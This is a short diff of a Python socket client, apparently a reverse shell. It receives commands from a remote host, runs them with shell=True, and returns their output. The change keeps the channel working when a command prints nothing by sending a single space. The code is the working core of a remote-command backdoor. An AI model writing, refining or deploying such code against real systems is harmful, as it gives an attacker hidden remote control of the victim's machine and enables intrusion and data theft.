@@ -13,7 +13,10 @@ def client_program(target_ip='127.0.0.1', target_port=9999):
                 break
             if command.strip():
                 output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-                client_socket.send(output)
+                if output == b'':
+                    client_socket.send(b' ')
+                else:
+                    client_socket.send(output)
         except Exception as e:
             client_socket.send(str(e).encode('utf-8'))
 
